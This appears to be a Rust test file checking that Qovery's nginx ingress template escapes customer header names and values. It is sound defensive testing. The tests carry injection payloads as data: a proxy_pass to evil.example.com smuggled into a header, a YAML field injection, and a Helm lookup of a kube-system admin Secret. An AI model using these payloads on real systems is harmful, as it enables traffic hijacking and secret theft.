//! Covers the nginx `configuration-snippet` rendering of `q-ingress-tls`, where customer
//! header maps are interpolated into nginx config nested inside a YAML block scalar — two
//! grammars deep, so neither YAML quoting nor a plain filter call is enough on its own.

use qovery_engine::tera_utils::render_one_off;
use serde_json::json;
use tera::Context;

const INGRESS_HTTP: &str = include_str!("../lib/common/charts/q-ingress-tls/templates/ingress-http.j2.yaml");

fn render_with_headers(add_headers: serde_json::Value, proxy_set_headers: serde_json::Value) -> String {
    let mut context = Context::new();
    context.insert("k8s_remove_nginx", &false);
    context.insert("k8s_use_api_gateway", &false);
    context.insert("has_wildcard_domain", &true);
    context.insert("http_hosts_has_regex_path", &false);
    context.insert("nginx_ingress_controller_server_snippet", &"");
    context.insert("nginx_ingress_controller_configuration_snippet", &"");
    context.insert("sanitized_name", &"router-name");
    context.insert("id", &"z1234567");
    context.insert("long_id", &"00000000-0000-0000-0000-000000000001");
    context.insert("associated_service_long_id", &"00000000-0000-0000-0000-000000000002");
    context.insert("associated_service_type", &"application");
    context.insert("environment_long_id", &"00000000-0000-0000-0000-000000000003");
    context.insert("project_long_id", &"00000000-0000-0000-0000-000000000004");
    context.insert("certificate_alternative_names", &json!([]));
    context.insert("labels_group", &json!({ "common": {} }));
    context.insert("annotations_group", &json!({ "ingress": {} }));
    context.insert(
        "http_hosts_per_namespace_nginx",
        &json!({
            "app-ns": [{
                "domain_name": "app.example.com",
                "path": "/",
                "path_rewrite": "",
                "service_name": "app",
                "service_port": 8080,
            }]
        }),
    );
    context.insert(
        "advanced_settings",
        &json!({
            "network_ingress_add_headers": add_headers,
            "network_ingress_proxy_set_headers": proxy_set_headers,
            "network_ingress_cors_enable": false,
            "network_ingress_sticky_session_enable": false,
            "network_ingress_force_ssl_redirect": true,
            "network_ingress_proxy_body_size_mb": 100,
            "network_ingress_proxy_buffer_size_kb": 4,
            "network_ingress_proxy_connect_timeout_seconds": 60,
            "network_ingress_proxy_send_timeout_seconds": 60,
            "network_ingress_proxy_read_timeout_seconds": 60,
            "network_ingress_proxy_request_buffering": "on",
            "network_ingress_proxy_buffering": "on",
            "network_ingress_send_timeout_seconds": 60,
            "network_ingress_keepalive_time_seconds": 3600,
            "network_ingress_keepalive_timeout_seconds": 60,
            "network_ingress_whitelist_source_range": "",
            "network_ingress_denylist_source_range": "",
            "network_ingress_basic_auth_env_var": "",
            "network_ingress_nginx_limit_rpm": null,
            "network_ingress_nginx_limit_rps": null,
            "network_ingress_nginx_limit_burst_multiplier": null,
            "network_ingress_nginx_limit_connections": null,
            "network_ingress_nginx_custom_http_errors": null,
        }),
    );

    render_one_off(INGRESS_HTTP, &context).expect("ingress template should render")
}

fn configuration_snippet(rendered: &str) -> String {
    let ingress: serde_yaml::Value = serde_yaml::from_str(rendered).expect("rendered ingress must parse as YAML");
    ingress["metadata"]["annotations"]["nginx.ingress.kubernetes.io/configuration-snippet"]
        .as_str()
        .expect("configuration snippet must be a string")
        .to_string()
}

#[test]
fn header_maps_render_the_expected_nginx_directives() {
    let rendered = render_with_headers(
        json!({"X-Frame-Options": "DENY"}),
        json!({"X-Forwarded-Host": "app.example.com"}),
    );
    let snippet = configuration_snippet(&rendered);

    assert!(
        snippet.contains(r#"add_header X-Frame-Options "DENY";"#),
        "missing add_header directive in:\n{snippet}"
    );
    assert!(
        snippet.contains(r#"proxy_set_header X-Forwarded-Host "app.example.com";"#),
        "missing proxy_set_header directive in:\n{snippet}"
    );
}

#[test]
fn header_name_cannot_inject_nginx_config_or_break_the_manifest() {
    // `"` and `;` would close the directive; the newline would leave the block scalar and
    // land a sibling field on the Ingress itself
    let rendered = render_with_headers(
        json!({"X-Foo\"; proxy_pass http://evil.example.com;\ninjected: true": "v"}),
        json!({}),
    );

    let ingress: serde_yaml::Value = serde_yaml::from_str(&rendered).expect("rendered ingress must parse as YAML");
    assert!(ingress["injected"].is_null(), "injected root field in:\n{rendered}");

    // the payload survives only as inert characters inside the header name token: what must
    // not happen is a second directive, so assert on directive structure, not substrings
    let snippet = configuration_snippet(&rendered);
    let directives: Vec<&str> = snippet
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .filter(|l| l.starts_with("add_header") || l.starts_with("proxy_pass"))
        .collect();

    assert_eq!(directives.len(), 1, "exactly one directive expected in:\n{snippet}");
    assert!(
        directives[0].starts_with("add_header ") && directives[0].ends_with(r#" "v";"#),
        "the directive should be a single well-formed add_header in:\n{snippet}"
    );
    assert!(
        !directives[0].contains(';') || directives[0].matches(';').count() == 1,
        "the directive must not be terminated early in:\n{snippet}"
    );
}

#[test]
fn header_value_cannot_inject_nginx_config_or_break_the_manifest() {
    let rendered = render_with_headers(
        json!({"X-Foo": "v\"; proxy_pass http://evil.example.com;\ninjected: true"}),
        json!({}),
    );

    let ingress: serde_yaml::Value = serde_yaml::from_str(&rendered).expect("rendered ingress must parse as YAML");
    assert!(ingress["injected"].is_null(), "injected root field in:\n{rendered}");

    let snippet = configuration_snippet(&rendered);
    assert!(
        snippet.lines().filter(|l| l.contains("add_header")).count() == 1,
        "the directive must stay on a single line in:\n{snippet}"
    );
    // the quote is escaped for nginx rather than closing the string early
    assert!(snippet.contains(r#"\";"#), "quote should be escaped in:\n{snippet}");
}

#[test]
fn header_entry_is_skipped_when_the_name_sanitises_to_nothing() {
    let rendered = render_with_headers(json!({"\n\t \"": "v"}), json!({}));
    let snippet = configuration_snippet(&rendered);

    assert!(
        !snippet.contains("add_header"),
        "an unusable header name must not emit a directive in:\n{snippet}"
    );
}

#[test]
fn header_maps_do_not_leave_a_go_template_action_for_helm() {
    let baseline = render_with_headers(json!({}), json!({}));
    let rendered = render_with_headers(
        json!({"X-Foo": r#"{{ lookup "v1" "Secret" "kube-system" "admin" }}"#}),
        json!({}),
    );

    assert_eq!(
        rendered.matches("{{").count(),
        baseline.matches("{{").count(),
        "user input must not add a Go template action for Helm to evaluate in:\n{rendered}"
    );
}
